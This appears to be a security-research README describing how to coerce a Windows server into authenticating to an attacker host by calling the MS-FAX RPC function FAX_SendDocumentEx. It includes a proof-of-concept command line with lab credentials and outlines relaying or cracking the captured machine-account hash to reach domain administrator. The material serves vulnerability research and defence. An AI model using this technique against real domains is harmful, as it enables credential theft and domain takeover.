# MS-FAX - Remote call to FAX_SendDocumentEx (opnum 27)

## Summary

+ **Protocol**: [[MS-FAX]: Fax Server and Client Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/dabce486-05b1-4ea4-95fe-f2c3d5315ff4)

+ **Protocol UUID**: 6099fc12-3eff-11d0-abd0-00c04fd91a4e

+ **Protocol version**: 0.0

+ **SMB Named pipe**: `\PIPE\SHAREDFAX`

+ **Function name**: [`FAX_SendDocumentEx`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/bac2e95f-f18b-448f-bb42-cc63b6ff04b2)

+ **Function operation number**: `27`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\SHAREDFAX` and bind to the desired [`MS-FAX`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/dabce486-05b1-4ea4-95fe-f2c3d5315ff4) protocol (with uuid `6099fc12-3eff-11d0-abd0-00c04fd91a4e` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-FAX`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/dabce486-05b1-4ea4-95fe-f2c3d5315ff4) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\SHAREDFAX` This pipe is connected to the protocol [[MS-FAX]: Fax Server and Client Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/dabce486-05b1-4ea4-95fe-f2c3d5315ff4) and allows to call RPC functions of this protocol. We will then call the remote [`FAX_SendDocumentEx`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/bac2e95f-f18b-448f-bb42-cc63b6ff04b2) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
FAX_SendDocumentEx('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
error_status_t FAX_SendDocumentEx(
   [in] handle_t hBinding,
   [in, string, unique] LPCWSTR lpcwstrFileName,
   [in] LPCFAX_COVERPAGE_INFO_EXW lpcCoverPageInfo,
   [in] LPBYTE lpcSenderProfile,
   [in, range(0,FAX_MAX_RECIPIENTS)] 
     DWORD dwNumRecipients,
   [in, size_is(dwNumRecipients)] LPBYTE* lpcRecipientList,
   [in] LPCFAX_JOB_PARAM_EXW lpJobParams,
   [in, out, unique] LPDWORD lpdwJobId,
   [out] PDWORDLONG lpdwlMessageId,
   [out, size_is(dwNumRecipients)] 
     PDWORDLONG lpdwlRecipientMessageIds
 );
```

## References

+ Documentation of protocol [MS-FAX]: Fax Server and Client Remote Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/dabce486-05b1-4ea4-95fe-f2c3d5315ff4

+ Documentation of function `FAX_SendDocumentEx`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fax/bac2e95f-f18b-448f-bb42-cc63b6ff04b2